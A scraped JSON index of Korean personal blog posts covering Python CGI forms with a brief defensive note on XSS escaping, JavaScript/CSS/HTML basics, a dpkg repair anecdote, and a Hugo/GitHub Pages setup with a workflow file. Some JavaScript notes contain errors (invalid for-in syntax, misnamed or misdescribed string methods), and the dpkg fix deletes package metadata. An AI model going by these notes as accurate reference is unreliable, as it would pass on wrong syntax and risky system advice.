type=\u0026#34;submit\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; form 태그 : 특정 파일로 form 태그 안의 태그들을 전송\naction 속성 : form 안의 내용을 처리할 파일(목적지)를 설정한다. ex)\n\u0026lt;form action=\u0026#34;create.py\u0026#34;\u0026gt;\r\u0026lt;p\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;title\u0026#34; placeholder=\u0026#34;title\u0026#34;\u0026gt; \u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt; \u0026lt;textarea rows=\u0026#34;4\u0026#34; name=\u0026#34;description\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;/form\u0026gt; url 쿼리 스트링 생성자 역할을 한다.\nurl 쿼리 스트링은 form 안의 input 태그의 name 속성들과 목적지(처리할 파일)를 포함하고 있다.\nget 방식은 쿼리 스트링을 url에 넣어서 사용하는 것이 맞다. 하지만 post 방식은 url이 아닌 다른 곳에 내용을 담아 전송하게 된다.\nmethod 속성은 get과 post 방식을 설정할 수 있다. ex)\n\u0026lt;form action=\u0026#34;create.py\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt;\r\u0026lt;p\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;title\u0026#34; placeholder=\u0026#34;title\u0026#34;\u0026gt; \u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt; \u0026lt;textarea rows=\u0026#34;4\u0026#34; name=\u0026#34;description\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;/form\u0026gt; action 속성으로 연결한 python 파일에서 form 안의 내용들을 사용하려면 cgi.FieldStorage()을 사용한다. ex)\nimport cgi\rform = cgi.FieldStorage()\rtitle = form[\u0026#34;title\u0026#34;].value\rdescription = form[\u0026#34;description\u0026#34;].value form 안의 내용 중 사용자에게 노출이필요 없는 input 태그는 type=\u0026ldquo;hidden\u0026rdquo; 속성을 주어 숨긴다. ex) \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;pageId\u0026quot; value={}\u0026gt; 이벤트를 이용하여 form 안의 내용들을 특정 python 파일로 전송시키면 python 파일에서 내용을 처리하고 다른 html로 redirection 시키는 방식으로 웹 구성이 가능하다.\ncross site scripting (xss) 웹 페이지의 script란을 임의로 작성하여 의도되지 않은 동작을 하도록 하는 행위\n컴퓨터가 html 파일을 해석할 때, \u0026lt;script\u0026gt;를 만나면 출력 대상이 아닌, javascript로 처리해야 할 태그로 인식한다. xml 문법에 사용되는 특수문자를 대체하여 이를 막을 수 있다.\n'\u0026lt;' : \u0026amp;lt; '\u0026gt;' : \u0026amp;gt; ex) ''.replace('\u0026lt;','\u0026amp;lt;') \u0026ldquo;python html sanitizer\u0026rdquo; 로 검색하면 관련 패키지 검색이 가능하다.\n정리 python package Index (PyPI): python 패키지들의 목록이 저장되어 있는 곳, 필요한 패키지를 활용하자. CGI는 느려서 최근에는 잘 쓰이지 않고, FastCGI, 파이썬 전용 WSGI 등이 쓰인다. web framework : 웹에서 사용되는 공통적 작업들만 잘 추려서 만든 APIdjango, flask 가 이에 해당. Database 연동 Crawling: 웹페이지를 다운로드, 분석이 필요 (urllib, beautiful Soup 패키지 활용 가능) github의 trending 탭을 보면 현재 가장 인기 있는 패키지를 볼 수 있다. ","permalink":"https://aswinblue.github.io/Blog/post/webapplication/pythoncgi/","summary":"python CGI CGI는 Common Gateway Interface의 약자다. web application을 만들 수 있는 언어는 ruby, java, php 등 다양하지만 모두 CGI 규약을 따라 web server와 통신한다. web server는 사용자의 요청을 받으면 약속된 이름의 데이터를 환경변수로 web application에 전달하여 서로 교류한다. apache에서 python을 이용해 web application을 만들어 web server와 통신해 보자. $ a2enmod CGI 명령으로 apache의 CGI를 켜 주고, sudo service apache2 restart 로 설정 적용 /var/log/apache2/error.log 안에 apache 실행시 발생한 에러 로그가 담겨있다.","title":"PythonCGI"},{"content":"JavaScript 기본적으로 HTML 위에서 돌아가는 코드 body 태그 안에 태그를 넣고 안에 작성\ndocument를 호출하고, .으로 함수를 호출한다.\nquerySelector(\u0026rsquo;\u0026rsquo;)로 원하는 element 선택 가능, \u0026lsquo;\u0026lsquo;안의 내용은 css 선택자 문법과 같음\nquerySelectorAll(\u0026rsquo;\u0026rsquo;)로 원하는 속성의 element들을 nodeList(배열과 유사)형태로 선택 가능\nex ) document.querySelector('body')\nex ) document.querySelector('#new')\nex ) document.write(\u0026quot;hello world\u0026quot;)\n태그 안에 javaScript를 사용하는 속성값으로 사용\nex ) \u0026lt;input type=\u0026quot;button\u0026quot; value=\u0026quot;hello\u0026quot; onclick=\u0026quot;alert('hello')\u0026quot;\u0026gt;\n특정 태그 안에서 자기자신을 호출할 때에는 querySelector를 호출하지 않고 this를 사용하면 된다.\nex ) \u0026lt;input type=\u0026quot;button\u0026quot; id=\u0026quot;hello\u0026quot; onclick=\u0026quot;document.querySelector('#hello').style.color='black';\u0026quot;\u0026gt;\nex ) \u0026lt;input type=\u0026quot;button\u0026quot; id=\u0026quot;hello\u0026quot; onclick=\u0026quot;this.style.color='black';\u0026quot;\u0026gt;\nvar 로 변수를 선언 가능하다. (var 이 없어도 된다)\n별도의 파일로 분리한 후 파일의 링크를 지정한다.\nex ) \u0026lt;script src=\u0026quot;script.js\u0026quot;\u0026gt; \u0026lt;/script\u0026gt;\n연산자 = : 대입 연산자\n== : 비교 연산자, 좌항과 우항이 같으면 true\n=== : 비교 연산자, 좌항과 우항의 type 까지 비교\nex ) null === undefined : false\nex ) null == undefined : true\nex ) 123 == \u0026quot;123\u0026quot; : true\nex ) 123 === \u0026quot;123\u0026quot; : false\n+ : 덧셈 연산자, 문자열 병합에도 사용 가능\n배열 var NAME = [] 형태로 선언 .length : 배열의 길이를 반환하는 메소드 함수 선언 function FUNCTION_NAME () {} 형태로 함수 선언, ()안에는 인자가, {}안에는 함수 body가 들어간다. 인자로 self를 넣으면 python의 함수가 호출된 객체를 지칭하도록 사용할 수 있다. return 예약어를 통해 함수 종료시 값을 반환 가능(return 필수 아님) 동일한 이름의 함수가 다시 정의되면 이전의 함수는 삭제된다. 객체 var NAME = {}; 형태로 선언 가능\nex ) var coworker = {\u0026quot;designer\u0026quot; : \u0026quot;A\u0026quot;, \u0026quot;programmer\u0026quot; : \u0026quot;B\u0026quot;, \u0026quot;data scientist\u0026quot; : \u0026quot;C\u0026quot;};\n객체의 값은 . 이나 [] 로 참조 가능, property라고 칭한다.\nex ) coworker.designer\nex ) coworker[\u0026quot;data scientist\u0026quot;]\n객체의 필드들은 ,로 구분해야 한다. 함수도 {} 다음에 ,를 찍어준다.\nex ) var coworker = { \u0026quot;designer\u0026quot;:\u0026quot;A\u0026quot;, showAll:function( ){ }, \u0026quot;programmer\u0026quot;:\u0026quot;B\u0026quot; }\n이미 선언된 객체에 새로운 값 추가 혹은 기존 값 변경 가능\nex ) coworker.new = \u0026quot;D\u0026quot;\nex ) coworker.programmer = \u0026quot;E\u0026quot;\nfor ( .. in ~~ ) {} : 객체 내부 순회, ..는 내부 원소를 지칭할 변수를 선언하고, ~~에는 객체를 넣어준다.\nex ) for (var key : coworker) {}\n객체 내부에 함수도 선언 가능, method라고 칭한다.\nex ) var body = { setColor:function( ){ } }\nex ) coworker.setColor = function() {}\n객체 내부의 메소드에서 객체를 칭할 때에는 this를 사용\nex ) funciton () { for (var key in this) {} }\n데이터 타입 primitive Boolean Null Undefined Number 연산으로 계산 가능 String \u0026rsquo; \u0026rsquo; 나 \u0026quot; \u0026quot; 로 묶어서 사용 + 으로 concatenate 가능 Symbol Object 문자열 (String) .startWith(STRING) : 문자열이 STRING 으로 시작하면(prefix) true를 반환, 아니면 false를 반환 .slice(VALUE) : 시작점으로 부터 VALUE만큼의 글자를 제거 (문자열 자르기) .substring(VALUE) : 시작점으로 부터 VALUE만큼의 글자를 제거 () .replace(\u0026quot;/^AB\u0026quot;, '') : 정규식을 이용, AB로 시작하는 prefix 제거 (문자열 치환) Json .hasOwnProperty(KEY) : json 데이터에 KEY 라는 key가 존재한다면 true를 반환, 아니면 false를 반환 이벤트 onclick : 클릭 이벤트가 일어났을 때 onchange : 텍스트 에디터의 내용이 변경되었을 경우 onkeydown : 키를 눌렀을 때 메소드 alert(\u0026rsquo; \u0026lsquo;) : 브라우저의 경고창에 \u0026rsquo;\u0026rsquo; 안의 내용을 띄움 .length : 문자열의 길이를 반환, 배열의 길이를 반환 .indexOf(\u0026rsquo; \u0026lsquo;) : 문자열 중 \u0026lsquo;\u0026lsquo;에 속하는 문자 혹은 문자열이 시작되는 index를 반환, 0부터 카운팅 .trim() : 문자열의 공백을 제거 .value : element의 값을 뜻하는 변수 호출 함수 var repeat = setInterval(function, time) : time 만큼 delay를 주고 function을 반복한다. 독립 thread로 동작한다. clearInterval(repeat) : 인자로 받은 interval 반복함수를 정지한다. var result = setTimeout(function, time) : time만큼 delay후 function을 실행한다. 실행후 result에는 \u0026rsquo;true\u0026rsquo;가 저장된다. Jquery javascript상에서 document를 대체하여 사용성을 높인 라이브러리\n$() 로 시작한다.\nex ) $('a').css('color','red') : 모든 \u0026lsquo;a\u0026rsquo; 태그의 css 속성 중 color을 red로 변경\n참조 document \u0026lt; DOM (Document Object Model) \u0026lt; window ajax : 웹페이지를 변경하지 않고 내용 변경 cookie : 사용자에게 개별화된 서비스 제공 offline web application : 인터넷이 끊겨도 동작하는 어플리케이션 webRTC : 화상통신 웹 speech(로 시작하는 API) : 사용자 음성 처리 webGL : 3차원 그래픽 webVR : 가상현실 ","permalink":"https://aswinblue.github.io/Blog/post/webapplication/javascript/","summary":"JavaScript 기본적으로 HTML 위에서 돌아가는 코드 body 태그 안에 태그를 넣고 안에 작성\ndocument를 호출하고, .으로 함수를 호출한다.\nquerySelector(\u0026rsquo;\u0026rsquo;)로 원하는 element 선택 가능, \u0026lsquo;\u0026lsquo;안의 내용은 css 선택자 문법과 같음\nquerySelectorAll(\u0026rsquo;\u0026rsquo;)로 원하는 속성의 element들을 nodeList(배열과 유사)형태로 선택 가능\nex ) document.querySelector('body')\nex ) document.querySelector('#new')\nex ) document.write(\u0026quot;hello world\u0026quot;)\n태그 안에 javaScript를 사용하는 속성값으로 사용\nex ) \u0026lt;input type=\u0026quot;button\u0026quot; value=\u0026quot;hello\u0026quot; onclick=\u0026quot;alert('hello')\u0026quot;\u0026gt;\n특정 태그 안에서 자기자신을 호출할 때에는 querySelector를 호출하지 않고 this를 사용하면 된다.","title":"JavaScript"},{"content":"CSS 특정 개체에 효과를 부과한다. 이를 declaration 이라 칭한다. 중복의 제거 가능, 유지보수 수월, 가독성 증가 위에서 부터 아래로 읽어가며 효과 적용, 중복 불가능한 효과에 대해서는 이전 효과가 사라짐 tag 선택자 \u0026lt; calss 선택자 \u0026lt; id 선택자 로 우선 순위가 높다. html 문서 안에 \u0026lt;style\u0026gt; 태그 안에 작성 가능\nex ) \u0026lt;style\u0026gt; a { color:black; } \u0026lt;/style\u0026gt;\n태그의 종류별로 속성 설정 가능\n여기서 태그 a 는 선택자(selector)라고 한다.\n선택자는 ,로 구별하여 함께 사용 가능\nex ) \u0026lt;style\u0026gt; a, h1 { color:black; } \u0026lt;/style\u0026gt;\n특정 태그의 자식태그 중 하나의 속성을 지정하고 싶다면 띄워쓰기로 구분한다. ex ) 중괄호{} 안에 declaration을 작성한다.\n하나의 declaration은 ;로 끝나서 다음 declaration과 구분된다.\n특정 태그 안에 style 속성을 넣어 작성 가능\nex ) \u0026lt;a style=\u0026quot;color:black\u0026quot;\u0026gt; \u0026lt;/a\u0026gt;\n다른 파일로 만들어 사용 가능\n재사용이 가능해 가장 효율적인 방법\n웹페이지 안에 직접 css를 넣는 것이 트래픽적 관점에서는 더 효율적이지만, 재사용성과 캐싱 기법에 의해 본 기법이 더 효율적이다.\nex ) \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;style.css\u0026quot;\u0026gt; 특정 태그(element)를 지정해 효과 설정이 가능하다.\nex ) \u0026lt;style\u0026gt; a { color:black; } \u0026lt;/style\u0026gt;\n특정 class를 지정해 효과 설정이 가능하다. class를 지칭할 때에는 이름 앞에 . 을 찍는다. 태그 선택자 보다 우선 순위가 높다.\nex ) \u0026lt;style\u0026gt; .saw{color:gray;} \u0026lt;/style\u0026gt;\n특정 id를 지정해 효과 설정이 가능하다. id를 지정할 때에는 이름 앞에 # 을 찍는다. class보다 우선 순위가 높다.\nex ) \u0026lt;style\u0026gt; #active{color:red;} \u0026lt;/style\u0026gt;\n스타일 PROPERTY:PROPERTY_VALUE; 형태로 존재한다. color:red : 색깔 변경(빨강) text-decoration:none : 꾸미기 없음 text-decoration:underline : 밑줄 font-size:45px : 글자 크기 설정 text-align:center : 글자 정렬 설정(가운데 정렬) border-width:5px : 테두리 굵기 설정 border-color:red : 테두리 색상 설정 border-style:solid : 테두리 모양 설정(직선) border 스타일 및 일부 스타일은 축약해서 사용 가능하다.\nex) \u0026lt;style\u0026gt; a{ border: 5px red solid;} \u0026lt;/style\u0026gt;\nborder-bottom: 1px solid gray : 아래쪽 테두리에만 설정 적용 display:inline : 태그의 레벨 속성(inline element - block element)을 변경 display:none : 화면에 표시 안함 display:grid : grid 형태로 표시 grid-template-colums: 150px 1fr : 그리드 형태를 열로 하고, 첫 열은 150, 둘째 열은 남은 공간을 사용하도록 설정 padding:20px : 테두리와 내용 사이의 버퍼 설정 margin:10px : 테두리 바깥과 다른 element 사이의 버퍼 설정 width:100px : element 폭 설정 단위 px : 픽셀 fr : 남은 자유공간으로 그 크기는 ((현재 fr 수치 / \u0026lt;총 사용된 fr\u0026gt;) * 남은 공간) 으로 계산된다. 미디어 쿼리 반응형 웹(responsive web) 을 위한 내용\n@media() {} 와 같이 표현되며, () 안에는 조건문이 들어가고, {} 안에는 적용 할 내용이 들어간다.\nex ) \u0026lt;style\u0026gt; @media(min-width:800px) {div {display:none;}} \u0026lt;/style\u0026gt;\nhttp://caniuse.com : 특정 스타일을 사용했을 때 몇 %의 브라우저가 해당 스타일을 지원하는지 확인 가능한 사이트\n","permalink":"https://aswinblue.github.io/Blog/post/webapplication/css/","summary":"CSS 특정 개체에 효과를 부과한다. 이를 declaration 이라 칭한다. 중복의 제거 가능, 유지보수 수월, 가독성 증가 위에서 부터 아래로 읽어가며 효과 적용, 중복 불가능한 효과에 대해서는 이전 효과가 사라짐 tag 선택자 \u0026lt; calss 선택자 \u0026lt; id 선택자 로 우선 순위가 높다. html 문서 안에 \u0026lt;style\u0026gt; 태그 안에 작성 가능\nex ) \u0026lt;style\u0026gt; a { color:black; } \u0026lt;/style\u0026gt;\n태그의 종류별로 속성 설정 가능\n여기서 태그 a 는 선택자(selector)라고 한다.\n선택자는 ,로 구별하여 함께 사용 가능","title":"Css"},{"content":"HTML W3C에서 HTML 규칙을 규정, 웹 브라우저 제작사들이 이를 참조하여 브라우저를 만든다. 태그 element라고 칭하기도 한다. 부모 자식 관계가 존재 \u0026lt;TAG_NAME\u0026gt; 로 시작하고 \u0026lt;/TAG_NAME\u0026gt;로 끝냄 태그별로 검색 엔진에서 노출되는 중요도가 다르다. 태그의 종류에 따라 줄 전체를 사용하거나(block level element), 내용의 크기 만큼의 공간만 사용하는 태그(lnline element)들이 있다. html : body와 head를 통틀어 묶은 최 고위 태그 관용적으로 \u0026lt;!doctype html\u0026gt; 을 붙여 쓴다. body : 본문을 묶는 태그 head : 본문을 설명하는 태그 속성(attribute) \u0026lt;TAG_NAME ATTRIBUTE\u0026gt; 와 같은 형태로 태그 이름 뒤에 붙음 body 속성 strong : 굵은 글씨\nu : 밑줄\nh1 : 제목 1\nh2 : 제목 2\nh6 : 제목 6\np : 단락 설정\nbr : 줄바꿈\nimg : 이미지\n\u0026lt;img src=\u0026quot;\u0026quot;\u0026gt; : src에 경로 지정\nli : 리스트\nul태그를 부모로 가짐 ul : 리스트 그루핑을 위한 태그\nli 태그를 자식으로 가짐 unordered-list ol : 넘버링 되는 리스트를 위한 태그\nordered-list a : 링크\nAnchor의 약자 href 속겅 필요 (hypertext reference) target : 창을 여는 방법, \u0026ldquo;_blank\u0026rdquo; : 새창 title : 마우스 오버레이시 툴팁 표시 input :\ntype=\u0026ldquo;checkbox\u0026rdquo; : 체크박스 type=\u0026ldquo;button\u0026rdquo; : 버튼 onclick=\u0026quot;\u0026quot; : \u0026quot;\u0026quot; 사이에는 javascript가 들어간다. 버튼 클릭 시 동작할 내용 \u0026lt;input\u0026gt; 으로 끝난다. \u0026lt;input/\u0026gt; 이나 \u0026lt;input\u0026gt; \u0026lt;/input\u0026gt; 으로 사용하지 않는다. font :\ncss가 등장하기 이전에 문자의 스타일을 설정하게 하기 위함 어껀 정보도 없는 태그, 기자인만을 위함 class : 태그들을 특정 그룹으로 묶기 위함\n하나의 태그에 두 개 이상의 class 지정 가능 id : 특정 태그에 명칭을 붙이기 위함\nclass 보다 높은 우선순위 단 한 번만 사용하도록 권장, 중복하여 사용하지 않도록 한다. div : 아무 의미 없이 디자인의 용도로만 사용하는 태그, block element\nspan : div와 같지만 inline element\nform : 폼 데이터 전송을 위한 태그, 하위\naction : 데이터를 어디로 전송할지 나타내는 속성 method : 데이터를 어떻게 전송할지 나타내는 속성. post/get을 사용 가능하다. head title : 제목 meta : 현재는 사용되자 않음 style : CSS 코드 삽입부 link 참조\nrel 참조 preload : href값에 선언된 리소스를 페이지 로드전에 요청해서 받아오게 지정한다. as 속성과 함께 사용된다. 상세설명 예시: \u0026lt;link rel=\u0026quot;preload\u0026quot; href=\u0026quot;style.css\u0026quot; as=\u0026quot;style\u0026quot; /\u0026gt; ","permalink":"https://aswinblue.github.io/Blog/post/webapplication/html/","summary":"HTML W3C에서 HTML 규칙을 규정, 웹 브라우저 제작사들이 이를 참조하여 브라우저를 만든다. 태그 element라고 칭하기도 한다. 부모 자식 관계가 존재 \u0026lt;TAG_NAME\u0026gt; 로 시작하고 \u0026lt;/TAG_NAME\u0026gt;로 끝냄 태그별로 검색 엔진에서 노출되는 중요도가 다르다. 태그의 종류에 따라 줄 전체를 사용하거나(block level element), 내용의 크기 만큼의 공간만 사용하는 태그(lnline element)들이 있다. html : body와 head를 통틀어 묶은 최 고위 태그 관용적으로 \u0026lt;!doctype html\u0026gt; 을 붙여 쓴다. body : 본문을 묶는 태그 head : 본문을 설명하는 태그 속성(attribute) \u0026lt;TAG_NAME ATTRIBUTE\u0026gt; 와 같은 형태로 태그 이름 뒤에 붙음 body 속성 strong : 굵은 글씨","title":"HTML"},{"content":"Linux 서버에 개발 환경을 세팅하는데 뭔가 제대로 되지 않아 이미 환경설정을 해 본 다른 사람에게 원격으로 도움을 요청했다.\n하지만 그 사람이 리눅스에 익숙하지 않았는지, 우리 서버를 잘못 만져 apt가 먹통이 되는 현상이 발생했다.\n본 해프닝에 대해 서술하자면 아래와 같다.\n원인 /bin 디렉터리 안의 python bin파일을 강제로 삭제한 것이 원인으로 추정된다.\n환경 설정을 하는데 제대로 되지 않으니 sudo apt-get upgrade 명령도 남용하기도 했다.\n현상 apt를 이용해 install, remove를 하려 하면 py3compile, py3clean 등에서 오류가 발생하였다.\napt 명령을 수행하면\n/usr/bin/dpkg return an errorcode(1) 오류가 발생하며 정상 동작하지 않는다.\ninstall -f 명령도 먹히지 않았다.\n해결 python bin파일이 없어졌고, python이 없다는 내용이 떴으므로 python을 다시 설치해 봤다.\napt가 제대로 동작하지 않았으므로 git에서 python을 받아 빌드하여 설치했다.\ndpkg return an errorcode(1) 을 검색해보니 dpkg에 문제가 있을 수 있다는 내용이 많았다.\ndpkg를 재설정 해보라는 글들이 많아 내용대로 따라가 보았다.\n/var/lib/dpkg/info 에는 설치된 프로그램의 목록들이 저장되어 있는듯 하다.\napt 명령을 수행할 때 오류가 발생하는 프로그램들을 찾아 rm 명령으로 해당 프로그램의 내용을 삭제한다.\n삭제 후 dpkg --configure -a 명령을 사용하여 dpkg를 재설정 해준다.\n그 후 apt 명령을 사용하여 설치, 삭제를 해 보니 dpkg를 리셋한 내용들은 오류에 뜨지 않았다.\n오류가 나지 않을 때 까지 dpkg를 계속 재설정 해주니 정상 동작하게 되었다.\n결론 /bin 안의 파일들을 강제로 삭제하면 apt가 충돌이 일어나 동작하지 않을 수 있으므로 주의한다.\n/var/lib/dpkg/info 에서 설치된 패키지의 내용들을 확인 가능하다.\ndpkg --configure -a 명령으로 dpkg를 리셋할 수 있다.\n","permalink":"https://aswinblue.github.io/Blog/post/linux/linux_apt/","summary":"Linux 서버에 개발 환경을 세팅하는데 뭔가 제대로 되지 않아 이미 환경설정을 해 본 다른 사람에게 원격으로 도움을 요청했다.\n하지만 그 사람이 리눅스에 익숙하지 않았는지, 우리 서버를 잘못 만져 apt가 먹통이 되는 현상이 발생했다.\n본 해프닝에 대해 서술하자면 아래와 같다.\n원인 /bin 디렉터리 안의 python bin파일을 강제로 삭제한 것이 원인으로 추정된다.\n환경 설정을 하는데 제대로 되지 않으니 sudo apt-get upgrade 명령도 남용하기도 했다.\n현상 apt를 이용해 install, remove를 하려 하면 py3compile, py3clean 등에서 오류가 발생하였다.","title":"Linux_apt"},{"content":"Hugo를 이용해 블로그 만들기 Git과 markdown을 이용하여 git을 블로그처럼 이용하는 사람들이 있다는 것을 알았다.\n게다가 UI를 보기 좋게 꾸며줄 수 있는 툴들도 찾았는데, 그 중 Hugo를 사용해 보았다.\nHugo는 Go 언어로 짜여져 있어 apt-get으로도 설치가 가능하고, 소스 코드를 받아 빌드하여 쓸 수도 있다.\n내 컴퓨터에는 Go가 이미 설치되 있던 터라 apt-get으로 hugo를 받아서 사용해 보았다.\n설치는 정상적으로 되었고, 처음에는 잘 동작하는 듯 했는데, theme을 적용하니 ERROR들이 뜨기 시작했다.\n인터넷 검색을 아무리 해 봐도 해결책이 보이지 않고, 해당 git에 issue를 날려보기도 했는데 응답이 없어서 혼자 이것저것 뒤져 보았다.\n알고보니 내 hugo의 버전이 너무 낮아서 발생한 현상이었고, 덩달아 Go의 버전도 낮다는 것을 알아냈다.\nGo언어는 apt-get 대신 인터넷에서 tar파일을 받아서 압축을 풀어 사용했고, Hugo는 소스코드를 받아 Go 언어로 빌드하여 사용하였다.\n(brew를 이용해 보라고도 해서 brew를 설치 해 보기도 했는데, 잘 동작 하지 않아서 그만뒀다.)\n버전을 최신으로 맞추고 나니 모두 정상동작, git에 올려놓은 issue를 뻘쭘하게 혼자 close했다.\n링크 hugo 환경설정 및 사용방법 가이드\n아래 주소의 글쓴이도 hugo로 블로그를 만들어 관리하고 있다. 이분의 글을 토대로 환경을 세팅했다.\nhttps://github.com/Integerous/Integerous.github.io\nHugo git 사이트\nHugo의 소스파일을 다운받을 수 있다.\nhttps://github.com/gohugoio/hugo\n내가 사용한 theme의 git 주소\n설명대로 theme을 다운받고, config파일을 수정해 주어야 최종적으로 적용이 된다.\nhttps://github.com/cntrump/hugo-notepadium\nGo 언어 설치 가이드\nhttps://golang.org/doc/install\nHugo 설치 가이드\nhttps://gohugo.io/getting-started/installing/\n환경 세팅 (window) 리눅스 환경세팅은 apt, yum을 이용하면 간단하게 수행 가능하여 생략한다.\nGo 언어를 설치한다. 설치파일로 받아서 설치하면 간단하다. 리눅스에 설치할 경우, apt를 사용하면 낮은 버전이 설치될 수 있으니 코드를 받아 설치하는걸 추천한다. Hugo를 설치한다. 압축파일 형태로 제공되며, 압축을 푼 후 path 설정만 해주면 된다. 리눅스의 경우 코드를 이용해 설치할 수 있다. git 레퍼지토리를 2개 생성한다. 한개는 글 작성용, 한개는 publish용이다. (이 경우, \u0026lt;GITHUB_ID\u0026gt;.github.io 이름으로 repository를 생성한다. 그렇지 않으면 정상동작하지 않는다.)\nex) github.com/AswinBlue/AswinBlue.github.io 작성용은 소스코드에 해당하며 publish용은 컴파일된 바이너리에 해당한다고 보면 된다. 로컬PC에서 Hugo 프로젝트를 생성한다. hugo new site \u0026lt;SITE\u0026gt; 명령으로 새로운 hugo 프로젝트를 생성한다. 생성한 프로젝트를 git과 연동시킨다. 프로젝트 root디렉터리에 (3)에서 만든 소스용 git을 연동시킨다. /public 디렉터리에 (3)에서 만든 publish용 git을 연동시킨다. git 폴더 안에 git을 연동하려면 git submodule add \u0026lt;URL\u0026gt;명령어를 이용한다. 테마를 선택한다. 인터넷에서 hugo 테마를 검색하여, 원하는 테마의 git repository를 /themes 경로에 clone 한다. 이후, 해당 테마에서 지원하는 config 파일을 root 경로에 복사한다. config 파일은 toml, yaml, json 형태로 작성이 가능하며, hugo에서는 toml -\u0026gt; yaml -\u0026gt; json 순서대로 config파일을 찾아 적용한다. (즉, config.toml파일이 있으면 config.yml파일은 적용되지 않음) 기본 탬플릿을 설정한다. /archtypes/default.md 파일을 수정하면, hugo new NEW_POST.md 를 이용해 새로운 파일을 생성할 때 사용되는 기본 md파일 탬플릿을 정의할 수 있다. 파일 생성시 .md 확장자가 붙여야 정상 동작함에 주의한다. Quick Start 프로젝트 생성 새로운 Hugo 사이트를 생성하는 명령어, 폴더 안에 Hugo 구조에 맞게 폴더 및 파일이 자동 생성된다.\nhugo new site \u0026lt;NAME\u0026gt; 생성된 폴더에서 새로운 post를 생성하는 명령어, content 폴더 안에 archtype에 맞게 내용을 적어 파일을 생성한다.\nhugo new \u0026lt;POST\u0026gt;.md\rex) hugo new post/hugo.md 테마에 맞는 형식으로 content 폴더 안의 내용을 이용해 public 폴더 안에 내용을 생성한다. : hugo -t \u0026lt;THEME\u0026gt;\nconfig파일에 따라 hugo --config config.yml 와 같이 명령어를 사용할 수도 있다.\nconfig파일에서 baseURL 을 페이지 주소로 설정해야 css 및 javascript가 정상 동작 한다. html에서 hugo문법으로 config파일에 선언된 baseURL을 가져오는 것은 {{ .Page.Site.BaseURL }} 와 같이 사용하면 된다. 본 페이지는 hugo-PaperMod 테마를 사용했다.\n문서 최상단에 +++로 둘러쌓인 부분은 설정 부분이다. draft=false로 설정을 해야 화면에 표시됨에 주의한다.\ntoml을 사용한다면 +++로 formatter를 구성 하고, yaml은 ---, json은 {} 을 사용한다. public 폴더에 생성한 내용을 push 하기 전 테스트 해 본다.\nhugo server [--theme \u0026lt;THEME_PATH\u0026gt;] 서버 실행 후 http://localhost:1313 경로에서 웹 브라우저로 내용을 확인할 수 있다.\n내용이 완벽하다면 public 폴더 안의 git을 push 하면 \u0026lt;GIT_ID\u0026gt;.github.io 주소에서 방금 본 내용을 볼 수 있다. ex : aswinblue.github.io\nGo와 Hugo의 설치만 잘 하면 사용 가이드는 인터넷에 잘 정리된 글들이 많다. 참조하면 활용에 문제는 없을 것이다.\nAdsense 추가 구글 애드센스를 휴고 Blog에 넣고싶다면, 아래와 같은 절차를 거치면 된다.\nthemes/원하는_테마/layouts/partials/ 디렉터리 안에 adsense.html 파일을 만들고, 애드센스에 필요한 script를 붙여넣은 후 저장한다. themes/원하는_테마/layouts/partials/ 디렉터리 안에 head.html 파일을 열고, {{- partial \u0026quot;adsense.html\u0026quot; . -}} 한줄을 추가하고 저장한다. hugo -t 원하는_테마 명령으로 다시 빌드하고, 서버에 push한다. sidebar 형태의 구문을 넣고싶다면, baseof.html 파일을 수정해야 한다. \u0026lt;div class=\u0026quot;grid-container\u0026quot;\u0026gt; 태그로 main을 감싸고, main과 sidebar을 동일한 level에 배치한다.\n# before\r\u0026lt;main class=\u0026#34;main\u0026#34;\u0026gt;\r{{- block \u0026#34;main\u0026#34; . }}{{ end }}\r\u0026lt;/main\u0026gt; # after\r\u0026lt;div class=\u0026#34;grid-container\u0026#34;\u0026gt;\r{{ partial \u0026#34;sidebar.html\u0026#34; . }}\r\u0026lt;main class=\u0026#34;main\u0026#34;\u0026gt;\r{{- block \u0026#34;main\u0026#34; . }}{{ end }}\r\u0026lt;/main\u0026gt;\r\u0026lt;/div\u0026gt; github page 자동화 github에서 제공하는 CI/CD 인 github actions 를 사용하면 push시 자동으로 배포를 할 수 있다.\ngithub actions -\u0026gt; Categories:Pages -\u0026gt; Hugo 선택 템플릿 파일로 HugoBlog/.github/workflows/hugo.yml 파일을 제공한다. 본인의 상황에 맞게 작성한 후 remote branch에 반영한다. # Sample workflow for building and deploying a Hugo site to GitHub Pages\rname: Deploy Hugo site to Pages\ron:\r# Runs on pushes targeting the default branch\rpush:\rbranches: [\u0026#34;master\u0026#34;]\r# Allows you to run this workflow manually from the Actions tab\rworkflow_dispatch:\r# Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages\rpermissions:\rcontents: read\rpages: write\rid-token: write\r# Allow only one concurrent deployment, skipping runs queued between the run in-progress and latest queued.\r# However, do NOT cancel in-progress runs as we want to allow these production deployments to complete.\rconcurrency:\rgroup: \u0026#34;pages\u0026#34;\rcancel-in-progress: false\r# Default to bash\rdefaults:\rrun:\rshell: bash\rjobs:\r# Build job\rbuild:\rruns-on: ubuntu-latest\renv:\rHUGO_VERSION: 0.108.0\rsteps:\r- name: Install Hugo CLI\rrun: |\rwget -O ${{ runner.temp }}/hugo.deb https://github.com/gohugoio/hugo/releases/download/v${HUGO_VERSION}/hugo_extended_${HUGO_VERSION}_linux-amd64.deb \\\r\u0026amp;\u0026amp; sudo dpkg -i ${{ runner.temp }}/hugo.deb\r- name: Install Dart Sass Embedded\rrun: sudo snap install dart-sass-embedded\r- name: Checkout\ruses: actions/checkout@v3\rwith:\rsubmodules: recursive\r- name: Setup Pages\rid: pages\ruses: actions/configure-pages@v3\r- name: Install Node.js dependencies\rrun: 